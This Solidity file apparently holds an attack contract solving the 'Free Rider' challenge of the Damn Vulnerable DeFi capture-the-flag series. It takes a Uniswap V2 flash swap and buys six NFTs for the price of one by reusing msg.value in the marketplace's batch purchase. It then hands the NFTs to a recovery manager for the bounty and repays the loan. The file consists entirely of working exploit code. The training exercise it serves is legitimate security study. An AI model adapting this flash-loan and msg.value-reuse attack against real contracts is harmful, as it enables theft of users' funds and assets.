// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "./FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

contract RiderAttack {
    IUniswapV2Pair pair;
    IERC20 token;
    WETH weth;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;

    constructor (address _pair, address _token, address _weth, address _marketPlace, address _recovery) payable {
        pair = IUniswapV2Pair(_pair);
        token = IERC20(_token);
        weth = WETH(payable(_weth));
        marketplace = FreeRiderNFTMarketplace(payable(_marketPlace));
        nft = marketplace.token();
        recoveryManager = FreeRiderRecoveryManager(_recovery);
    }

    function attack(
        uint amount0Out, //15 eth
        uint amount1Out
    ) external {
        pair.swap(amount0Out, amount1Out, address(this), "uniswapV2Call()");
    }

    function uniswapV2Call(
        address sender,
        uint,
        uint,
        bytes calldata
    ) external {
        require(sender == address(this), "Invalid sender");
        uint256 repayAmount = 15.05 ether;
        
        weth.withdraw(weth.balanceOf(address(this)));

        require(address(this).balance >= repayAmount, "Insufficient funds");

        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        nft.setApprovalForAll(address(this), true);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            if(i == AMOUNT_OF_NFTS - 1){
                nft.safeTransferFrom(payable(address(this)), address(recoveryManager), i, abi.encode(address(this)));
            } else {
                nft.safeTransferFrom(payable(address(this)), address(recoveryManager), i);
            }
        }

        weth.deposit{value: repayAmount}();
        weth.transfer(msg.sender, repayAmount);
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}